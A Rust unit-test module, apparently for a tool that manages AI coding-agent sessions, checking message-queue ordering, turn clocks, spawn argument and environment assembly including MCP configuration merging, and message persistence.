    /// unrelated turn's activity (e.g. a hidden bus-wake read) to an old row.
    #[test]
    fn advance_dequeued_turn_clears_pointers_when_the_queue_drains_to_idle() {
        let mut inner = test_inner("opencode");
        inner.turn_user_row = Some(1);
        inner.current_origin_tag = Some("a-tag".into());
        inner.turn.busy = true; // empty queue: on_turn_end goes idle

        let next = inner.turn.on_turn_end();
        assert!(next.is_none(), "precondition: nothing queued behind A");
        advance_dequeued_turn(&mut inner, &next);

        assert_eq!(inner.turn_user_row, None);
        assert_eq!(inner.current_origin_tag, None);
    }

    #[test]
    fn turn_clock_records_occ_start_for_each_promoted_turn() {
        let mut c = TurnClock::default();
        assert_eq!(c.started_millis, 0);
        c.begin_turn();
        let first = c.started_millis;
        assert!(first > 0);
        c.on_turn_end(true); // queued message popped → new turn
        assert!(c.started_millis >= first);
        c.on_turn_end(false); // queue drained → idle
        assert!(
            c.started_millis >= first,
            "time remains telemetry only after idle"
        );
    }

    /// [`TurnClock::mark_consumed_once`] fires exactly once per turn — the gate
    /// `note_turn_activity` uses so a chatty turn's later stdout lines / delta
    /// events don't re-query the DB after the first "consumed" mark landed.
    #[test]
    fn mark_consumed_once_fires_once_then_resets_on_new_turn() {
        let mut c = TurnClock::default();
        // Fresh clock, no turn begun yet: still gates true→false like any other
        // "first observation" — begin_turn is what a real send always calls
        // first, but the gate itself doesn't depend on it.
        assert!(c.mark_consumed_once(), "first observation fires");
        assert!(
            !c.mark_consumed_once(),
            "second observation in the same turn no-ops"
        );
        assert!(!c.mark_consumed_once(), "third+ stays a no-op");
        // A new turn resets the gate — begin_turn is called at EVERY turn-start
        // site (direct send, promoted queue, dequeue via on_turn_end(true)).
        c.begin_turn();
        assert!(c.mark_consumed_once(), "a new turn re-arms the gate");
        assert!(!c.mark_consumed_once(), "and gates again within that turn");
    }

    /// `on_turn_end(true)` (a queued message popped into a fresh turn) goes
    /// through `begin_turn` internally, so it must re-arm the gate exactly like
    /// a direct/promoted send does — a dequeued turn's activity must still be
    /// attributable to ITS OWN opening row, not silently skipped because the
    /// previous turn already consumed the gate.
    #[test]
    fn mark_consumed_once_rearms_across_queue_dequeue() {
        let mut c = TurnClock::default();
        c.begin_turn();
        assert!(c.mark_consumed_once());
        c.on_turn_end(true); // dequeue: still busy → begin_turn() again
        assert!(
            c.mark_consumed_once(),
            "the dequeued turn gets its own first mark"
        );
    }

    /// The computer injection is assembled onto a spawn from its OWN field,
    /// not from `extra_args` — so `refresh_computer_injection` can replace it
    /// before a respawn without argv surgery. It rides LAST, and
    /// an engine that never had it (concierge/curator lead) contributes
    /// nothing.
    #[test]
    fn build_args_appends_the_computer_injection_from_its_own_field() {
        let mut inner = test_inner("claude");
        inner.extra_args = vec!["--settings".into(), "hook.json".into()];
        inner.computer_args = vec!["--mcp-config".into(), "/weft/computer-L2.mcp.json".into()];

        let args = build_args(&inner);
        let tail: Vec<&String> = args.iter().rev().take(2).collect();
        assert_eq!(
            tail,
            vec![&"/weft/computer-L2.mcp.json".to_string(), &"--mcp-config".to_string()],
            "the computer injection must ride last: {args:?}"
        );
        assert!(args.windows(2).any(|w| w[0] == "--settings" && w[1] == "hook.json"));

        // Replacing the field alone changes the spawn — no argv surgery.
        inner.computer_args = vec!["--mcp-config".into(), "/weft/computer-L3.mcp.json".into()];
        assert!(build_args(&inner).contains(&"/weft/computer-L3.mcp.json".to_string()));
        assert!(!build_args(&inner).contains(&"/weft/computer-L2.mcp.json".to_string()));

        inner.computer_args = vec![];
        let none = build_args(&inner);
        assert!(
            !none.iter().any(|a| a == "--mcp-config"),
            "an engine without computer use must spawn without it: {none:?}"
        );
    }

    /// `spawn_env` must deep-merge the bus and computer halves of the SHARED
    /// `OPENCODE_CONFIG_CONTENT` key. Splitting the computer injection into
    /// its own field moved this merge from construction to spawn assembly; if
    /// it were dropped, `Command::envs`' last-wins would silently strip the
    /// bus server from every opencode session that also has computer use.
    #[test]
    fn spawn_env_deep_merges_the_shared_opencode_config_key() {
        let mut inner = test_inner("opencode");
        inner.extra_env = vec![(
            "OPENCODE_CONFIG_CONTENT".into(),
            serde_json::json!({"mcp": {"weft_bus": {"type": "remote", "url": "http://bus"}}})
                .to_string(),
        )];
        inner.computer_env = vec![(
            "OPENCODE_CONFIG_CONTENT".into(),
            serde_json::json!({"mcp": {"weft_computer": {"type": "remote", "url": "http://comp"}}})
                .to_string(),
        )];

        let pairs = spawn_env(&inner);
        let merged: Vec<&(String, String)> = pairs
            .iter()
            .filter(|(k, _)| k == "OPENCODE_CONFIG_CONTENT")
            .collect();
        assert_eq!(merged.len(), 1, "the duplicate key must collapse to one entry: {pairs:?}");
        let v: serde_json::Value = serde_json::from_str(&merged[0].1).unwrap();
        assert_eq!(v["mcp"]["weft_bus"]["url"], "http://bus", "the bus server must survive");
        assert_eq!(v["mcp"]["weft_computer"]["url"], "http://comp", "so must the computer one");
    }

    /// The codex bearer is a DISTINCT env key, so it passes through
    /// untouched alongside unrelated entries.
    #[test]
    fn spawn_env_passes_the_codex_bearer_through_beside_other_entries() {
        let mut inner = test_inner("codex");
        inner.extra_env = vec![("WEFT_ASK_URL".into(), "http://ask".into())];
        inner.computer_env = vec![("WEFT_COMPUTER_MCP_TOKEN".into(), "deadbeef".into())];

        let pairs = spawn_env(&inner);
        assert!(pairs.iter().any(|(k, v)| k == "WEFT_ASK_URL" && v == "http://ask"));
        assert!(pairs.iter().any(|(k, v)| k == "WEFT_COMPUTER_MCP_TOKEN" && v == "deadbeef"));
    }

    #[test]
    fn build_args_fresh_vs_resume() {
        let mut inner = EngineInner {
            thread_id: 1,
            tool: "claude".into(),
            command: None,
            session_id: None,
            cwd: "/tmp".into(),
            extra_args: vec!["--mcp-config".into(), "x".into()],
            extra_env: vec![],
            computer_args: vec![],
            computer_env: vec![],
            computer_gen: None,
            system_prompt: "be lead".into(),
            native_id: None,
            pending_context_digest: None,
            slash_commands: vec![],
            turn: TurnState::default(),
            turn_id: 0,
            ask_dir: "lead".into(),
            clock: TurnClock::default(),
            child: None,
            child_reg: None,
            child_permit: None,
            stdin: None,
            current: None,
            open_texts: std::collections::HashMap::new(),
            turn_saw_text: false,
            interrupting: false,
            generation: 0,
            reset_epoch: 0,
            pending_skill_refresh: false,
            pending_command_refresh: false,
            last_context_tokens: None,
            last_model: None,
            last_reasoning: None,
            last_window: None,
            last_mcp_servers: vec![],
            last_tools: vec![],
            probe_seq: 0,
            probe_committed: 0,
            current_origin_tag: None,
            tool_rows: std::collections::HashMap::new(),
            inline_image_rows: std::collections::VecDeque::new(),
            stopped: false,
            codex_client: None,
            acp_client: None,
            acp_pending_asks: Vec::new(),
            turn_user_row: None,
            hidden_receipt_inflight: Arc::new(DashSet::new()),
            last_assistant_uuid: None,
            rewinding: false,
            quota_failover_committing: false,
            tearing_down: false,
            worktree_id: None,
        };
        let fresh = build_args(&inner);
        assert!(fresh.contains(&"--append-system-prompt".to_string()));
        assert!(!fresh.contains(&"--resume".to_string()));
        assert_eq!(fresh.last(), Some(&"x".to_string()));
        inner.native_id = Some("abc".into());
        let resumed = build_args(&inner);
        let i = resumed.iter().position(|a| a == "--resume").unwrap();
        assert_eq!(resumed[i + 1], "abc");
    }

    #[test]
    fn turnstate_remove_edit_reorder() {
        let mut t = TurnState::default();
        for id in [10, 20, 30] {
            t.queue.push_back(Outgoing {
                text: format!("t{id}"),
                queue_id: Some(id),
                ..Default::default()
            });
        }
        assert!(t.edit(20, "edited"));
        assert_eq!(t.queue[1].text, "edited");

        assert!(t.reorder(&[30, 10, 20]));
        let ids: Vec<i32> = t.queue.iter().filter_map(|o| o.queue_id).collect();
        assert_eq!(ids, vec![30, 10, 20]);

        assert!(t.remove(10));
        let ids: Vec<i32> = t.queue.iter().filter_map(|o| o.queue_id).collect();
        assert_eq!(ids, vec![30, 20]);

        // 非排列 / 未知 id 被拒
        assert!(!t.reorder(&[30])); // 长度不符
        assert!(!t.reorder(&[30, 99])); // same length, unknown id → rejected
        let ids: Vec<i32> = t.queue.iter().filter_map(|o| o.queue_id).collect();
        assert_eq!(ids, vec![30, 20]); // queue untouched
        assert!(!t.remove(999));
        assert!(!t.edit(999, "x"));
    }

    #[test]
    fn reorder_preserves_untracked_items() {
        // Visible T1, an internal untracked delivery, then visible T2.
        let mut t = TurnState::default();
        t.queue.push_back(Outgoing {
            text: "t1".into(),
            queue_id: Some(10),
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            text: "nudge".into(),
            tracked: false,
            queue_id: None,
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            text: "t2".into(),
            queue_id: Some(20),
            ..Default::default()
        });
        // Reorder the two visible items; the untracked nudge must keep its slot.
        assert!(t.reorder(&[20, 10]));
        let ids: Vec<Option<i32>> = t.queue.iter().map(|o| o.queue_id).collect();
        assert_eq!(ids, vec![Some(20), None, Some(10)]);
        assert_eq!(t.queue.len(), 3, "untracked nudge must not be dropped");
        assert_eq!(t.queue[1].text, "nudge");
    }

    #[test]
    fn remove_keeps_bus_read_position_in_sync() {
        // A, B queued; a bus wake lands (read at index 2); then C queued.
        let mut t = TurnState::default();
        assert!(t.try_begin_send()); // idle → busy
        t.queue.push_back(Outgoing {
            text: "a".into(),
            queue_id: Some(1),
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            text: "b".into(),
            queue_id: Some(2),
            ..Default::default()
        });
        assert!(!t.request_bus_read()); // busy → coalesced at index 2
        assert_eq!(t.bus_read_pos, Some(2));
        t.queue.push_back(Outgoing {
            text: "c".into(),
            queue_id: Some(3),
            ..Default::default()
        });
        // Deleting A (index 0, before the wake) shifts the wake left so C still
        // delivers AFTER the inbox-read, not ahead of it.
        assert!(t.remove(1));
        assert_eq!(t.bus_read_pos, Some(1));
        // Deleting C (index 1, == wake index, not before) leaves the wake put.
        assert!(t.remove(3));
        assert_eq!(t.bus_read_pos, Some(1));
    }

    #[test]
    fn cap_counts_only_visible_items() {
        let mut t = TurnState::default();
        // 4 visible user sends + 1 hidden plumbing delivery interleaved.
        t.queue.push_back(Outgoing {
            queue_id: Some(1),
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            queue_id: None,
            tracked: false,
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            queue_id: Some(2),
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            queue_id: Some(3),
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            queue_id: Some(4),
            ..Default::default()
        });
        assert_eq!(t.queue.len(), 5);
        assert_eq!(
            visible_queued(&t),
            4,
            "hidden delivery must not eat the cap budget"
        );
    }

    #[test]
    fn reorder_refused_while_bus_wake_pending() {
        let mut t = TurnState::default();
        assert!(t.try_begin_send()); // idle → busy
        t.queue.push_back(Outgoing {
            queue_id: Some(1),
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            queue_id: Some(2),
            ..Default::default()
        });
        assert!(!t.request_bus_read()); // wake coalesced at index 2
        assert!(t.bus_read_pos.is_some());
        // A valid permutation is still refused while the wake is pending, so the
        // wake can't be mis-placed relative to a dragged message.
        assert!(!t.reorder(&[2, 1]));
        let ids: Vec<i32> = t.queue.iter().filter_map(|o| o.queue_id).collect();
        assert_eq!(ids, vec![1, 2], "queue untouched on refusal");
    }

    #[test]
    fn finalize_serializes_delivery_seq_when_present() {
        let delivered = serde_json::to_value(Push::Finalize {
            thread_id: 1,
            message_id: 2,
            status: "complete".into(),
            content: None,
            seq: Some(9),
        })
        .unwrap();
        assert_eq!(delivered["seq"], serde_json::json!(9));

        let ordinary = serde_json::to_value(Push::Finalize {
            thread_id: 1,
            message_id: 3,
            status: "complete".into(),
            content: None,
            seq: None,
        })
        .unwrap();
        assert!(ordinary.get("seq").is_none());
    }

    #[test]
    fn engine_switched_push_carries_authoritative_route_identity() {
        let push = serde_json::to_value(Push::EngineSwitched {
            thread_id: 7,
            session_id: Some(9),
            direction_id: Some(11),
            tool: "claude".to_string(),
            model: None,
            command: Some("cc-claude".to_string()),
        })
        .unwrap();

        assert_eq!(push["type"], "engine_switched");
        assert_eq!(push["thread_id"], 7);
        assert_eq!(push["session_id"], 9);
        assert_eq!(push["direction_id"], 11);
        assert_eq!(push["tool"], "claude");
        assert_eq!(push["command"], "cc-claude");
    }

    #[test]
    fn finalize_text_only_replaces_plain_rows() {
        use crate::store::entities::lead_message::Model;
        let row = |kind: &str, content: &str| Model {
            id: 1,
            thread_id: 1,
            session_id: None,
            turn_id: 1,
            role: "user".into(),
            kind: kind.into(),
            content: content.into(),
            status: "complete".into(),
            created_at: "0".into(),
            seq: None,
            native_anchor: None,
            consumed_at: None,
        };
        let plain = Outgoing {
            text: "edited".into(),
            queue_id: Some(1),
            ..Default::default()
        };
        // Plain text, no attachments → use the (edited) Outgoing text.
        assert_eq!(
            finalize_text(
                &row("text", r#"{"text":"orig","images":[],"files":[]}"#),
                &plain
            ),
            Some("edited".to_string()),
        );
        // Persisted images but out.images cleared (per-turn spill) → keep cached body.
        let spilled = Outgoing {
            text: "/tmp/x.png".into(),
            images: vec![],
            queue_id: Some(1),
            ..Default::default()
        };
        assert_eq!(
            finalize_text(
                &row("text", r#"{"text":"","images":["data:..."],"files":[]}"#),
                &spilled
            ),
            None,
        );
        // Resident inline image (out.images non-empty) → keep cached body.
        let resident = Outgoing {
            text: "hi".into(),
            images: vec![("image/png".into(), "abc".into())],
            queue_id: Some(1),
            ..Default::default()
        };
        assert_eq!(
            finalize_text(&row("text", r#"{"text":"hi"}"#), &resident),
            None
        );
        // Command row → keep cached body.
        assert_eq!(
            finalize_text(&row("command", r#"{"command":"x","args":""}"#), &plain),
            None
        );
    }

    /// queue_edit must preserve images/files in the persisted row; only text changes.
    #[tokio::test]
    async fn queue_edit_preserves_images_and_files_in_persisted_row() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        // A real thread row: insert_lead_message refuses deleted/nonexistent
        // threads (the deletion fence).
        let ws = repo::create_workspace(&db, "ws").await.unwrap();
        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude")
            .await
            .unwrap();
        // Insert a queued message that has images and files in its content.
        let original = serde_json::json!({
            "text": "original text",
            "images": [{"data": "abc", "media_type": "image/png"}],
            "files": ["/tmp/attach.txt"]
        })
        .to_string();
        let row =
            repo::insert_lead_message(&db, t.id, None, 1, "user", "text", &original, "queued")
                .await
                .unwrap();

        // Simulate what queue_edit now does: read row, update text only.
        let existing = repo::get_message(&db, row.id).await.unwrap().unwrap();
        let mut val: serde_json::Value = serde_json::from_str(&existing.content).unwrap();
        val["text"] = serde_json::Value::String("edited text".into());
        repo::update_message_content(&db, row.id, &val.to_string())
            .await
            .unwrap();

        let updated = repo::get_message(&db, row.id).await.unwrap().unwrap();
        let content: serde_json::Value = serde_json::from_str(&updated.content).unwrap();
        assert_eq!(content["text"], "edited text");
        assert!(content["images"].is_array());
        assert_eq!(
            content["images"].as_array().unwrap().len(),
            1,
            "images must be preserved"
        );
        assert!(content["files"].is_array());
        assert_eq!(
            content["files"][0], "/tmp/attach.txt",
            "files must be preserved"
        );
    }

    /// FIX 1: an Outgoing with files or images exposes has_attachments=true via queue_items.
    #[test]
    fn queue_items_exposes_has_attachments() {
        let mut turn = TurnState::default();
        turn.busy = true;
        // One attachment-bearing item.
        turn.queue.push_back(Outgoing {
            text: "look at this".into(),
            images: vec![("image/png".into(), "abc".into())],
            tracked: true,
            queue_id: Some(1),
            has_attachments: true,
            ..Default::default()
        });
        // One plain text item.
        turn.queue.push_back(Outgoing {
            text: "just text".into(),
            tracked: true,
            queue_id: Some(2),
            has_attachments: false,
            ..Default::default()
        });
        let items = queue_items(&turn);
        assert_eq!(items.len(), 2);
        assert!(
            items[0].has_attachments,
            "attachment item must report has_attachments=true"
        );
        assert!(
            !items[1].has_attachments,
            "plain text item must report has_attachments=false"
        );
    }
}
